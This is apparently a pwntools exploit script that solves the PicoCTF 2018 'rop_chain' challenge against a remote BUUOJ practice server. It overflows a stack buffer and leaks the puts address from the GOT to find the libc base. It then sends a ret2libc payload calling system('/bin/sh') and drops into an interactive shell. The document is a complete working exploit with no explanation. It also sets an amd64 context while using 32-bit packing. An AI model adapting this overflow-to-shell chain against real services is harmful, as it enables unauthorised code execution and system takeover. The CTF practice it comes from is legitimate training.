from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../PicoCTF_2018_rop_chain')
libc = ELF('../libc-2.27.so')

target = remote('node4.buuoj.cn', 26163)

# Leak libc.
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

payload = b'a' * 0x18 + b'a' * 0x4 + p32(puts_plt) + p32(main) + p32(puts_got)
target.sendlineafter('> ', payload)

puts_addr = u32(target.recv(4))
libc.address = puts_addr - libc.sym['puts']
print(hex(libc.address))

system = libc.sym['system']
shell = next(libc.search(b'/bin/sh'))

print(hex(system), hex(shell))

payload = b'a' * 0x18 + b'a' * 0x4 + p32(system) + p32(main) + p32(shell)
target.sendlineafter('> ', payload)
target.interactive()